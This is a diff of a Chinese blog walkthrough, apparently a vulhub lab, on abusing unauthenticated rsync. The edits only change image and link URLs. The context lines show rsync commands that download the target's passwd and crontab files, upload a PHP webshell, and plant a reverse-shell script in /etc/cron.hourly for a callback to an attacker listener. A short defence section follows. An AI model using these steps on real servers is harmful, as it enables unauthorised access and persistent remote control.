@@ -17,27 +17,27 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
 
 `rsync ysync://url:端口/目录`
 
-![](http://cdn.laohuan.art/2020-05-29_16-40-45.png)
+![](http://qn.laohuan.xin/2020-05-29_16-40-45.png)
 
 下载目标的passwd文件
 
 `rsync rsync://url:80/src/etc/passwd ./`
 
-![](http://cdn.laohuan.art/2020-05-29_16-45-44.png)
+![](http://qn.laohuan.xin/2020-05-29_16-45-44.png)
 
 查看目标主机用户
 
-![](http://cdn.laohuan.art/2020-05-29_16-47-07.png)
+![](http://qn.laohuan.xin/2020-05-29_16-47-07.png)
 
 #### 上传一句话木马
 
 `ysync -av shell.php rsync://url:端口/src`
 
-![](http://cdn.laohuan.art/2020-05-29_17-26-08.png)
+![](http://qn.laohuan.xin/2020-05-29_17-26-08.png)
 
 可以看到shell已经传到目标主机上
 
-![](http://cdn.laohuan.art/2020-05-29_15-23-36.png)
+![](http://qn.laohuan.xin/2020-05-29_15-23-36.png)
 
 #### 反弹shell
 
@@ -53,7 +53,7 @@ crond 命令每分锺会定期检查是否有要执行的工作，如果有要�
 
 `rsync ysync://url:端口/src/etc/crontab ./`
 
-![](http://cdn.laohuan.art/2020-05-29_21-27-30.png)
+![](http://qn.laohuan.xin/2020-05-29_21-27-30.png)
 
 红框内容表示每小时的第17分钟将会执行如下命令
 
@@ -73,17 +73,17 @@ crond 命令每分锺会定期检查是否有要执行的工作，如果有要�
 1. x.x.x.x为攻击机的IP地址
 2. 3950为攻击机的监听端口
 
-![](http://cdn.laohuan.art/2020-05-29_21-30-53.png)
+![](http://qn.laohuan.xin/2020-05-29_21-30-53.png)
 
 上传shell
 
 `rsync -av shell rsync://url:端口/src/etc/cron.hourly`
 
-![](http://cdn.laohuan.art/2020-05-29_21-32-40.png)
+![](http://qn.laohuan.xin/2020-05-29_21-32-40.png)
 
 在目标机的/etc/cron.hourly/下能看到上传的shell文件
 
-![](http://cdn.laohuan.art/2020-05-29-41.png)
+![](http://qn.laohuan.xin/2020-05-29-41.png)
 
 #### 反弹
 
@@ -93,13 +93,13 @@ crond 命令每分锺会定期检查是否有要执行的工作，如果有要�
 
 监听端口需和反弹shell里所一致
 
-![](http://cdn.laohuan.art/2020-05-29_21-33-58.png)
+![](http://qn.laohuan.xin/2020-05-29_21-33-58.png)
 
 实验里可根据具体时间修改靶机的/etc/crontab的文件，快速反弹shell，而实际环境就慢慢的等到每个小时的第17分钟吧
 
 稍加等待，便能获得shell
 
-![](http://cdn.laohuan.art/2020-05-29_15-18-02.png)
+![](http://qn.laohuan.xin/2020-05-29_15-18-02.png)
 
 #### 防御
 
@@ -125,7 +125,7 @@ secrets file = /etc/rsyncd.passwd
 
 #### 参考链接
 
-<https://blog.csdn.net/qq_36374896/article/details/84112341/>
+<http://blog.csdn.net/qq_36374896/article/details/84112341/>
 
-<https://github.com/vulhub/vulhub/tree/master/rsync/common/>
+<http://github.com/vulhub/vulhub/tree/master/rsync/common/>
 
